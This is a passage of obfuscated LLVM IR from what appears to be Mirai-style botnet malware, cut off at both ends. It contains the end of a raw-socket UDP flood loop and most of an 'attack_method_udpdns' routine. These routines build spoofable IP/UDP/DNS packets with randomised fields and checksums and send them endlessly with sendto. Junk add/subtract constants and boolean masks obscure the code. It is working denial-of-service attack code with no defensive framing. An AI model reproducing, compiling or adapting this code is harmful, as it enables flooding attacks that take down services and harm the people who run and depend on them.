; <label>:163:                                    ; preds = %73
  %164 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 4
  store i16 %164, i16* %166, align 2
  br label %167

; <label>:167:                                    ; preds = %163, %73
  %168 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 6
  store i8 17, i8* %169, align 1
  %170 = load i32, i32* @LOCAL_ADDR, align 4
  %171 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 8
  store i32 %170, i32* %172, align 4
  %173 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 9
  store i32 %178, i32* %180, align 4
  %181 = load i16, i16* %16, align 2
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 0
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %17, align 2
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 1
  store i16 %186, i16* %188, align 2
  %189 = load i32, i32* %19, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 12, -1804506436842613137
  %192 = add i64 %191, %190
  %193 = sub i64 %192, -1804506436842613137
  %194 = add i64 12, %190
  %195 = trunc i64 %193 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %198 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %197, i32 0, i32 2
  store i16 %196, i16* %198, align 2
  %199 = load i8*, i8** %22, align 8
  %200 = bitcast i8* %199 to i32*
  store i32 -1, i32* %200, align 4
  %201 = load i8*, i8** %22, align 8
  %202 = getelementptr inbounds i8, i8* %201, i64 4
  store i8* %202, i8** %22, align 8
  %203 = load i8*, i8** %22, align 8
  %204 = load i8*, i8** %18, align 8
  %205 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %203, i8* %204, i32 %205)
  br label %206

; <label>:206:                                    ; preds = %167
  %207 = load i32, i32* %9, align 4
  %208 = add i32 %207, 1721644720
  %209 = add i32 %208, 1
  %210 = sub i32 %209, 1721644720
  %211 = add nsw i32 %207, 1
  store i32 %210, i32* %9, align 4
  br label %68

; <label>:212:                                    ; preds = %68
  br label %213

; <label>:213:                                    ; preds = %348, %212
  store i32 0, i32* %9, align 4
  br label %214

; <label>:214:                                    ; preds = %342, %213
  %215 = load i32, i32* %9, align 4
  %216 = load i8, i8* %5, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp slt i32 %215, %217
  br i1 %218, label %219, label %348

; <label>:219:                                    ; preds = %214
  %220 = load i8**, i8*** %11, align 8
  %221 = load i32, i32* %9, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds i8*, i8** %220, i64 %222
  %224 = load i8*, i8** %223, align 8
  store i8* %224, i8** %23, align 8
  %225 = load i8*, i8** %23, align 8
  %226 = bitcast i8* %225 to %struct.iphdr*
  store %struct.iphdr* %226, %struct.iphdr** %24, align 8
  %227 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i64 1
  %229 = bitcast %struct.iphdr* %228 to %struct.udphdr*
  store %struct.udphdr* %229, %struct.udphdr** %25, align 8
  %230 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 2
  %235 = load i8, i8* %234, align 4
  %236 = zext i8 %235 to i32
  %237 = icmp slt i32 %236, 32
  br i1 %237, label %238, label %262

; <label>:238:                                    ; preds = %219
  %239 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %240 = load i32, i32* %9, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %239, i64 %241
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %242, i32 0, i32 1
  %244 = load i32, i32* %243, align 4
  %245 = call i32 @ntohl(i32 %244) #7
  %246 = call i32 @rand_next()
  %247 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %250, i32 0, i32 2
  %252 = load i8, i8* %251, align 4
  %253 = zext i8 %252 to i32
  %254 = lshr i32 %246, %253
  %255 = add i32 %245, -515681408
  %256 = add i32 %255, %254
  %257 = sub i32 %256, -515681408
  %258 = add i32 %245, %254
  %259 = call i32 @htonl(i32 %257) #7
  %260 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 9
  store i32 %259, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %238, %219
  %263 = load i16, i16* %13, align 2
  %264 = zext i16 %263 to i32
  %265 = icmp eq i32 %264, 65535
  br i1 %265, label %266, label %271

; <label>:266:                                    ; preds = %262
  %267 = call i32 @rand_next()
  %268 = trunc i32 %267 to i16
  %269 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 3
  store i16 %268, i16* %270, align 4
  br label %271

; <label>:271:                                    ; preds = %266, %262
  %272 = load i16, i16* %16, align 2
  %273 = zext i16 %272 to i32
  %274 = icmp eq i32 %273, 65535
  br i1 %274, label %275, label %280

; <label>:275:                                    ; preds = %271
  %276 = call i32 @rand_next()
  %277 = trunc i32 %276 to i16
  %278 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %279 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %278, i32 0, i32 0
  store i16 %277, i16* %279, align 2
  br label %280

; <label>:280:                                    ; preds = %275, %271
  %281 = load i16, i16* %17, align 2
  %282 = zext i16 %281 to i32
  %283 = icmp eq i32 %282, 65535
  br i1 %283, label %284, label %289

; <label>:284:                                    ; preds = %280
  %285 = call i32 @rand_next()
  %286 = trunc i32 %285 to i16
  %287 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %288 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %287, i32 0, i32 1
  store i16 %286, i16* %288, align 2
  br label %289

; <label>:289:                                    ; preds = %284, %280
  %290 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 7
  store i16 0, i16* %291, align 2
  %292 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %293 = bitcast %struct.iphdr* %292 to i16*
  %294 = call zeroext i16 @checksum_generic(i16* %293, i32 20)
  %295 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 7
  store i16 %294, i16* %296, align 2
  %297 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %298 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %297, i32 0, i32 3
  store i16 0, i16* %298, align 2
  %299 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %300 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %301 = bitcast %struct.udphdr* %300 to i8*
  %302 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 2
  %304 = load i16, i16* %303, align 2
  %305 = load i32, i32* %19, align 4
  %306 = sext i32 %305 to i64
  %307 = sub i64 0, %306
  %308 = sub i64 12, %307
  %309 = add i64 12, %306
  %310 = trunc i64 %308 to i32
  %311 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %299, i8* %301, i16 zeroext %304, i32 %310)
  %312 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 3
  store i16 %311, i16* %313, align 2
  %314 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 1
  %316 = load i16, i16* %315, align 2
  %317 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %318 = load i32, i32* %9, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 0
  %322 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %321, i32 0, i32 1
  store i16 %316, i16* %322, align 2
  %323 = load i32, i32* %10, align 4
  %324 = load i8*, i8** %23, align 8
  %325 = load i32, i32* %19, align 4
  %326 = sext i32 %325 to i64
  %327 = sub i64 0, 32
  %328 = sub i64 0, %326
  %329 = add i64 %327, %328
  %330 = sub i64 0, %329
  %331 = add i64 32, %326
  %332 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %333 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %334 = load i32, i32* %9, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %333, i64 %335
  %337 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %336, i32 0, i32 0
  %338 = bitcast %struct.sockaddr_in* %337 to %struct.sockaddr*
  store %struct.sockaddr* %338, %struct.sockaddr** %332, align 8
  %339 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %340 = load %struct.sockaddr*, %struct.sockaddr** %339, align 8
  %341 = call i64 @sendto(i32 %323, i8* %324, i64 %330, i32 16384, %struct.sockaddr* %340, i32 16)
  br label %342

; <label>:342:                                    ; preds = %289
  %343 = load i32, i32* %9, align 4
  %344 = add i32 %343, 724455543
  %345 = add i32 %344, 1
  %346 = sub i32 %345, 724455543
  %347 = add nsw i32 %343, 1
  store i32 %346, i32* %9, align 4
  br label %214

; <label>:348:                                    ; preds = %214
  br label %213

; <label>:349:                                    ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %4
  br label %498

; <label>:81:                                     ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  br label %498

; <label>:87:                                     ; preds = %81
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %498

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %309, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %316

; <label>:101:                                    ; preds = %96
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %102 = call noalias i8* @calloc(i64 600, i64 1) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %26, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %27, align 8
  %116 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %117 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %116, i64 1
  %118 = bitcast %struct.udphdr* %117 to %struct.dnshdr*
  store %struct.dnshdr* %118, %struct.dnshdr** %28, align 8
  %119 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %120 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %119, i64 1
  %121 = bitcast %struct.dnshdr* %120 to i8*
  store i8* %121, i8** %29, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = xor i8 %124, -1
  %126 = xor i8 15, -1
  %127 = xor i8 -40, -1
  %128 = or i8 %125, %126
  %129 = or i8 -40, %127
  %130 = xor i8 %128, -1
  %131 = and i8 %130, %129
  %132 = and i8 %124, 15
  %133 = and i8 %131, 64
  %134 = xor i8 %131, 64
  %135 = or i8 %133, %134
  %136 = or i8 %131, 64
  store i8 %135, i8* %123, align 4
  %137 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %138 = bitcast %struct.iphdr* %137 to i8*
  %139 = load i8, i8* %138, align 4
  %140 = xor i8 -16, -1
  %141 = xor i8 %139, %140
  %142 = and i8 %141, %139
  %143 = and i8 %139, -16
  %144 = and i8 %142, 5
  %145 = xor i8 %142, 5
  %146 = or i8 %144, %145
  %147 = or i8 %142, 5
  store i8 %146, i8* %138, align 4
  %148 = load i8, i8* %12, align 1
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 1
  store i8 %148, i8* %150, align 1
  %151 = load i8, i8* %19, align 1
  %152 = zext i8 %151 to i64
  %153 = sub i64 0, 41
  %154 = sub i64 0, %152
  %155 = add i64 %153, %154
  %156 = sub i64 0, %155
  %157 = add i64 41, %152
  %158 = add i64 %156, -4518370514005245097
  %159 = add i64 %158, 2
  %160 = sub i64 %159, -4518370514005245097
  %161 = add i64 %156, 2
  %162 = load i32, i32* %21, align 4
  %163 = sext i32 %162 to i64
  %164 = sub i64 0, %163
  %165 = sub i64 %160, %164
  %166 = add i64 %160, %163
  %167 = sub i64 0, %165
  %168 = sub i64 0, 4
  %169 = add i64 %167, %168
  %170 = sub i64 0, %169
  %171 = add i64 %165, 4
  %172 = trunc i64 %170 to i16
  %173 = call zeroext i16 @htons(i16 zeroext %172) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 2
  store i16 %173, i16* %175, align 2
  %176 = load i16, i16* %13, align 2
  %177 = call zeroext i16 @htons(i16 zeroext %176) #7
  %178 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 3
  store i16 %177, i16* %179, align 4
  %180 = load i8, i8* %14, align 1
  %181 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 5
  store i8 %180, i8* %182, align 4
  %183 = load i8, i8* %15, align 1
  %184 = icmp ne i8 %183, 0
  br i1 %184, label %185, label %189

; <label>:185:                                    ; preds = %101
  %186 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 4
  store i16 %186, i16* %188, align 2
  br label %189

; <label>:189:                                    ; preds = %185, %101
  %190 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 6
  store i8 17, i8* %191, align 1
  %192 = load i32, i32* @LOCAL_ADDR, align 4
  %193 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 8
  store i32 %192, i32* %194, align 4
  %195 = load i32, i32* %22, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 9
  store i32 %195, i32* %197, align 4
  %198 = load i16, i16* %16, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 0
  store i16 %199, i16* %201, align 2
  %202 = load i16, i16* %17, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %205 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %204, i32 0, i32 1
  store i16 %203, i16* %205, align 2
  %206 = load i8, i8* %19, align 1
  %207 = zext i8 %206 to i64
  %208 = sub i64 21, 485968847968754125
  %209 = add i64 %208, %207
  %210 = add i64 %209, 485968847968754125
  %211 = add i64 21, %207
  %212 = sub i64 %210, -1030747489867769628
  %213 = add i64 %212, 2
  %214 = add i64 %213, -1030747489867769628
  %215 = add i64 %210, 2
  %216 = load i32, i32* %21, align 4
  %217 = sext i32 %216 to i64
  %218 = sub i64 0, %217
  %219 = sub i64 %214, %218
  %220 = add i64 %214, %217
  %221 = add i64 %219, -8552246899855878836
  %222 = add i64 %221, 4
  %223 = sub i64 %222, -8552246899855878836
  %224 = add i64 %219, 4
  %225 = trunc i64 %223 to i16
  %226 = call zeroext i16 @htons(i16 zeroext %225) #7
  %227 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %228 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %227, i32 0, i32 2
  store i16 %226, i16* %228, align 2
  %229 = load i16, i16* %18, align 2
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %232 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %231, i32 0, i32 0
  store i16 %230, i16* %232, align 2
  %233 = call zeroext i16 @htons(i16 zeroext 256) #7
  %234 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %235 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %234, i32 0, i32 1
  store i16 %233, i16* %235, align 2
  %236 = call zeroext i16 @htons(i16 zeroext 1) #7
  %237 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %238 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %237, i32 0, i32 2
  store i16 %236, i16* %238, align 2
  %239 = load i8, i8* %19, align 1
  %240 = load i8*, i8** %29, align 8
  %241 = getelementptr inbounds i8, i8* %240, i32 1
  store i8* %241, i8** %29, align 8
  store i8 %239, i8* %240, align 1
  %242 = load i8, i8* %19, align 1
  %243 = zext i8 %242 to i32
  %244 = load i8*, i8** %29, align 8
  %245 = sext i32 %243 to i64
  %246 = getelementptr inbounds i8, i8* %244, i64 %245
  store i8* %246, i8** %29, align 8
  %247 = load i8*, i8** %29, align 8
  store i8* %247, i8** %30, align 8
  %248 = load i8*, i8** %29, align 8
  %249 = getelementptr inbounds i8, i8* %248, i64 1
  %250 = load i8*, i8** %20, align 8
  %251 = load i32, i32* %21, align 4
  %252 = sub i32 %251, -948548944
  %253 = add i32 %252, 1
  %254 = add i32 %253, -948548944
  %255 = add nsw i32 %251, 1
  call void @util_memcpy(i8* %249, i8* %250, i32 %254)
  store i32 0, i32* %23, align 4
  br label %256

; <label>:256:                                    ; preds = %287, %189
  %257 = load i32, i32* %23, align 4
  %258 = load i32, i32* %21, align 4
  %259 = icmp slt i32 %257, %258
  br i1 %259, label %260, label %294

; <label>:260:                                    ; preds = %256
  %261 = load i8*, i8** %20, align 8
  %262 = load i32, i32* %23, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds i8, i8* %261, i64 %263
  %265 = load i8, i8* %264, align 1
  %266 = sext i8 %265 to i32
  %267 = icmp eq i32 %266, 46
  br i1 %267, label %268, label %281

; <label>:268:                                    ; preds = %260
  %269 = load i8, i8* %24, align 1
  %270 = load i8*, i8** %30, align 8
  store i8 %269, i8* %270, align 1
  store i8 0, i8* %24, align 1
  %271 = load i8, i8* %25, align 1
  %272 = sub i8 %271, -2
  %273 = add i8 %272, 1
  %274 = add i8 %273, -2
  %275 = add i8 %271, 1
  store i8 %274, i8* %25, align 1
  %276 = load i8*, i8** %29, align 8
  %277 = load i32, i32* %23, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8, i8* %276, i64 %278
  %280 = getelementptr inbounds i8, i8* %279, i64 1
  store i8* %280, i8** %30, align 8
  br label %286

; <label>:281:                                    ; preds = %260
  %282 = load i8, i8* %24, align 1
  %283 = sub i8 0, 1
  %284 = sub i8 %282, %283
  %285 = add i8 %282, 1
  store i8 %284, i8* %24, align 1
  br label %286

; <label>:286:                                    ; preds = %281, %268
  br label %287

; <label>:287:                                    ; preds = %286
  %288 = load i32, i32* %23, align 4
  %289 = sub i32 0, %288
  %290 = sub i32 0, 1
  %291 = add i32 %289, %290
  %292 = sub i32 0, %291
  %293 = add nsw i32 %288, 1
  store i32 %292, i32* %23, align 4
  br label %256

; <label>:294:                                    ; preds = %256
  %295 = load i8, i8* %24, align 1
  %296 = load i8*, i8** %30, align 8
  store i8 %295, i8* %296, align 1
  %297 = load i8*, i8** %29, align 8
  %298 = load i32, i32* %21, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds i8, i8* %297, i64 %299
  %301 = getelementptr inbounds i8, i8* %300, i64 2
  %302 = bitcast i8* %301 to %struct.grehdr*
  store %struct.grehdr* %302, %struct.grehdr** %31, align 8
  %303 = call zeroext i16 @htons(i16 zeroext 1) #7
  %304 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %305 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %304, i32 0, i32 0
  store i16 %303, i16* %305, align 2
  %306 = call zeroext i16 @htons(i16 zeroext 1) #7
  %307 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %308 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %307, i32 0, i32 1
  store i16 %306, i16* %308, align 2
  br label %309

; <label>:309:                                    ; preds = %294
  %310 = load i32, i32* %9, align 4
  %311 = sub i32 0, %310
  %312 = sub i32 0, 1
  %313 = add i32 %311, %312
  %314 = sub i32 0, %313
  %315 = add nsw i32 %310, 1
  store i32 %314, i32* %9, align 4
  br label %96

; <label>:316:                                    ; preds = %96
  br label %317

; <label>:317:                                    ; preds = %497, %316
  store i32 0, i32* %9, align 4
  br label %318

; <label>:318:                                    ; preds = %491, %317
  %319 = load i32, i32* %9, align 4
  %320 = load i8, i8* %5, align 1
  %321 = zext i8 %320 to i32
  %322 = icmp slt i32 %319, %321
  br i1 %322, label %323, label %497

; <label>:323:                                    ; preds = %318
  %324 = load i8**, i8*** %11, align 8
  %325 = load i32, i32* %9, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds i8*, i8** %324, i64 %326
  %328 = load i8*, i8** %327, align 8
  store i8* %328, i8** %32, align 8
  %329 = load i8*, i8** %32, align 8
  %330 = bitcast i8* %329 to %struct.iphdr*
  store %struct.iphdr* %330, %struct.iphdr** %33, align 8
  %331 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i64 1
  %333 = bitcast %struct.iphdr* %332 to %struct.udphdr*
  store %struct.udphdr* %333, %struct.udphdr** %34, align 8
  %334 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %335 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %334, i64 1
  %336 = bitcast %struct.udphdr* %335 to %struct.dnshdr*
  store %struct.dnshdr* %336, %struct.dnshdr** %35, align 8
  %337 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %338 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %337, i64 1
  %339 = bitcast %struct.dnshdr* %338 to i8*
  %340 = getelementptr inbounds i8, i8* %339, i64 1
